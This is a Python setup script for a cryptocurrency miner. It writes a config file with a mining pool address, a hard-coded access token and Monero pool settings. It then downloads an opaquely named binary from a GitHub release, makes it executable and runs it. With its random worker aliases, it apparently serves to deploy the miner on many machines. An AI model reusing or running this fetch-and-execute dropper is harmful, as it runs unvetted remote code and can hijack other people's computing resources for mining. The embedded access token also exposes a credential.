import os
import json
import random
import subprocess
import hashlib
import stat
import urllib.request

# === 1. Generate worker name like: $(echo $RANDOM | md5sum | head -c 20)
def generate_worker_name():
    random_number = str(random.randint(0, 999999999)).encode()
    md5_hash = hashlib.md5(random_number).hexdigest()
    return md5_hash[:20]

worker_name = generate_worker_name()
print(f"[+] Generated worker name: {worker_name}")

# === 2. Get total CPU threads using `nproc`
def get_cpu_threads():
    try:
        return int(subprocess.check_output(["nproc"]).decode().strip())
    except Exception as e:
        print(f"[!] Failed to get CPU threads: {e}")
        return 1

cpu_threads = get_cpu_threads()
print(f"[+] Detected CPU Threads: {cpu_threads}")

# === 3. Create JSON config ===
config = {
    "ClientSettings": {
        "poolAddress": "wss://pps.minerlab.io/ws/PRAVEENTYM",
        "alias": worker_name,
        "accessToken": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJJZCI6ImQzNzMyODc2LTY5ZDctNGI1OC1hNmUzLWM2MzZkMGQ4ZDE0NiIsIk1pbmluZyI6IiIsIm5iZiI6MTcyNTM3NjkyOSwiZXhwIjoxNzU2OTEyOTI5LCJpYXQiOjE3MjUzNzY5MjksImlzcyI6Imh0dHBzOi8vcXViaWMubGkvIiwiYXVkIjoiaHR0cHM6Ly9xdWJpYy5saS8ifQ.sregOyk2PEyXv8ssdQDBtTps1JFBLghcJCzDFvaD6hWoVA_T-crfQZbiV0E_atqd6sxNHYKGmeVCOoU9crLU4mnojZdF1vyp3VttB3ZIqo3qIgr0R4jWnwZ95bGN1c6NE3zb9y7ZWor5-4ttLkR_5moxiZZvaKG2WWSxFJ-7kk6SVSw7z8iaYyVpPX1Tdu6pBWxDStYYaoVvgNzx6RShU_r2AVCB1JGfv16vKvAIGmPcluvS-ayKwfgOpY1uEbsH6Lswd_KGbB1aJC7g8AI1CUoYiUUl_CJUBZfG0FbBgtGDRhfPUcYM5z8BEyIrm6bfKhMHuJmIF86NJYydRUHgow",
        "pps": True,
        "trainer": {
            "cpu": True,
            "gpu": False,
            "cpuThreads": cpu_threads
        },
        "xmrSettings": {
            "disable": False,
            "enableGpu": False,
            "poolAddress": "54.237.214.165:8088",
            "customParameters": f"-t {cpu_threads}"
        }
    }
}

with open("appsettings.json", "w") as f:
    json.dump(config, f, indent=4)

print("[+] Created appsettings.json")

# === 4. Download kaospa binary ===
kaospa_url = "https://github.com/vedhagsvp/taberas/releases/download/mlb/kaospa"
kaospa_filename = "kaospa"

if not os.path.exists(kaospa_filename):
    print("[+] Downloading kaospa...")
    urllib.request.urlretrieve(kaospa_url, kaospa_filename)
    print("[+] Download complete.")
else:
    print("[!] kaospa already exists. Skipping download.")

# === 5. Make executables
os.chmod(kaospa_filename, os.stat(kaospa_filename).st_mode | stat.S_IEXEC)
os.chmod("appsettings.json", os.stat("appsettings.json").st_mode | stat.S_IEXEC)
print("[+] Set executable permissions.")

# === 6. Run kaospa binary
print("[+] Running ./kaospa ...")
subprocess.run(["./kaospa"])
